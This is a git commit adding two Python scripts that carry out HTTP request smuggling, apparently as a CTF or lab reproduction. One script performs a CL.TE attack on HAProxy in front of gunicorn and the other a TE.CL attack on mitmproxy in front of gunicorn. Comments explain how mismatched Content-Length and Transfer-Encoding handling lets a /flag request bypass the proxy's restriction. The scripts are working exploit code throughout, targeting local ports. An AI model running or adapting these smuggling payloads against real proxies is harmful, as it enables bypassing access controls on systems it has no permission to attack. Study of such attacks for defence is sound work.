398f1e1cded7e83e0c49d5ab3fff8b2671f097a8
p4k03n4t0r <paul__94@hotmail.com>
2020-09-15 21:00:31 +0200

    Initial commit

---
+++ haproxy-cl-te.py
@@ -0,0 +1,53 @@
+#!/usr/bin/env python3
+import socket
+from request_builder import Request_Builder
+
+HOST = '0.0.0.0'
+PORT = 8001
+
+# https://ctftime.org/writeup/20655
+# HAProxy uses the content length header (CL), because HAProxy ignores chunked encoding header due to adding the character 0x0b
+# by aligning the content length properly it will include the flag request as part of the body for HAProxy allowing to bypass the /flag restriction
+# gunicorn will use the chunked encoding header (TE), meaning the body of the hello_request will end after the 0
+# so it sees flag_request as a new request instead of part of the body of the hello_request 
+# gunicorn will handle them separately as two requests, resulting in two responses back to HAProxy
+# to retrieve the second response we send an extra request
+
+flag_request_builder = Request_Builder()
+flag_request_builder.url = "/flag"
+flag_request_builder.host = "{}:{}".format(HOST, PORT)
+flag_request = flag_request_builder.build()
+
+hello_request_builder = Request_Builder()
+hello_request_builder.url = "/hello"
+hello_request_builder.host = "{}:{}".format(HOST, PORT)
+hello_request_builder.add_content_length_header = True
+# body is empty, because we the flag request after manually
+# but for HAProxy the content-length must be big enough to include the flag request so it will be smuggled
+# we want to smuggle the chunked encoding length ('0' and two line break) and the flag_request
+hello_request_builder.content_length_offset = len("0\r\n\r\n") + len(flag_request)
+hello_request_builder.add_chunked_encoding_header = True
+hello_request_builder.add_chunked_encoding_header_value = ""
+hello_request_builder.add_chunked_encoding_body = True
+hello_request = hello_request_builder.build()
+
+extra_request_builder = Request_Builder()
+extra_request_builder.url = "/hello"
+extra_request_builder.host = "{}:{}".format(HOST, PORT)
+extra_request = extra_request_builder.build()
+
+msg = hello_request + flag_request + extra_request
+print("SEND:")
+print(msg)
+print("RAW:")
+print(msg.encode("ascii"))
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    s.sendall(msg.encode("ascii"))
+    response = s.recv(1024).decode("ascii")
+    print("RECEIVED:")
+    print(response)
+    response = s.recv(1024).decode("ascii")
+    print("RECEIVED:")
+    print(response)
---
+++ mitmproxy-te-cl.py
@@ -0,0 +1,58 @@
+#!/usr/bin/env python3
+import socket
+from request_builder import Request_Builder
+import time
+
+HOST = '0.0.0.0'
+PORT = 8002
+
+# https://blog.deteact.com/gunicorn-http-request-smuggling/
+# mitmproxy and gunicorn have different checks for encoding chunked header
+# mitmproxy will use the chunked encoding header (TE), thus mitmproxy will see flag_request and hello_request as one request
+# this allows the wrapped flag request to bypass the /flag filter, since flag_request is no real request for mitmproxy but just part of the body
+# gunicon will use the content length header (CL), thus gunicorn will see flag_request and hello_request as two requests and handle them separately, resulting in two responses back to mitmproxy
+# to retrieve the second response we send an extra request
+
+flag_request_builder = Request_Builder()
+flag_request_builder.url = "/flag"
+flag_request_builder.host = "{}:{}".format(HOST, PORT)
+flag_request = flag_request_builder.build()
+
+hello_request_builder = Request_Builder()
+hello_request_builder.url = "/hello"
+hello_request_builder.host = "{}:{}".format(HOST, PORT)
+hello_request_builder.add_content_length_header = True
+# we have to fix the content-length, so we adjust the offset
+# mitmproxy ignores the content-length, but gunicorn will use it
+# mitmproxy should only take some chunked encoding syntax and should end right before the smuggled request begins
+# thus we have to remove the length of the flag request from the offset
+# but we still have to add some offset back, because we have to account for the chunked encoding syntax
+# the syntax we have to account for is: <length of body, in this case flag request, in hex> + linebreak
+hello_request_builder.content_length_offset = - len(flag_request) + len(hex(len(flag_request)).replace("0x","") + "\r\n")
+hello_request_builder.add_chunked_encoding_header = True
+hello_request_builder.add_chunked_encoding_header_value = "asd"
+hello_request_builder.add_chunked_encoding_body = True
+hello_request_builder.body = flag_request
+hello_request = hello_request_builder.build()
+
+extra_request_builder = Request_Builder()
+extra_request_builder.url = "/hello"
+extra_request_builder.host = "{}:{}".format(HOST, PORT)
+extra_request = extra_request_builder.build()
+
+msg = hello_request + extra_request
+print("SEND:")
+print(msg)
+print("RAW:")
+print(msg.encode("ascii"))
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    s.sendall(msg.encode("ascii"))
+    response = s.recv(1024).decode("ascii")
+    print("RECEIVED:")
+    print(response)
+    time.sleep(1)
+    response = s.recv(1024).decode("ascii")
+    print("RECEIVED:")
+    print(response)
